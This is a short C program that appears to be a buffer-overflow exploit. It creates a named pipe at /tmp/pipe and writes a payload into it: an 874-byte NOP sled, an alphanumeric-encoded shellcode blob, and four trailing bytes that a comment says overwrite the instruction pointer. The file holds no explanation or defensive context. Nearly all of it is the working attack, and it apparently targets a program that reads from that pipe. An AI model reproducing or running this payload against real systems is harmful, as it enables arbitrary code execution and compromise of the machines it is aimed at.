#include <stdio.h> 
#include <string.h> 
#include <fcntl.h> 
#include <sys/stat.h> 
#include <sys/types.h> 
#include <unistd.h> 
 
int main() {
    char *pipe = "/tmp/pipe";  
    mkfifo(pipe, 0666);

    int fd = open(pipe, O_WRONLY);

    unsigned char payload[2000]; 
    memset(payload, '\x90', 874);
unsigned char buf[] =
"\x89\xe0\xdb\xc0\xd9\x70\xf4\x5e\x56\x59\x49\x49\x49\x49\x49"
"\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a"
"\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32"
"\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
"\x33\x5a\x44\x4b\x71\x48\x4a\x39\x76\x32\x72\x46\x70\x68\x74"
"\x6d\x35\x33\x4c\x49\x58\x67\x51\x78\x46\x4f\x51\x63\x45\x38"
"\x65\x50\x31\x78\x66\x4f\x52\x42\x33\x59\x50\x6e\x4c\x49\x69"
"\x73\x63\x62\x48\x68\x36\x68\x77\x70\x73\x30\x57\x70\x76\x4f"
"\x35\x32\x42\x49\x70\x6e\x36\x4f\x50\x73\x65\x38\x43\x30\x71"
"\x47\x33\x63\x4d\x59\x38\x61\x38\x4d\x4b\x30\x44\x71\x4b\x6b"
"\x50\x6a\x63\x31\x46\x38\x58\x4d\x6b\x30\x41\x41"
"\x1c\xd8\xff\xff"; //the last 4 bytes holds the instruction pointer

    memcpy(payload + 874, buf, 166 /* size of the shellcode */);

    write(fd, payload, strlen(payload));
    
    close(fd);

} 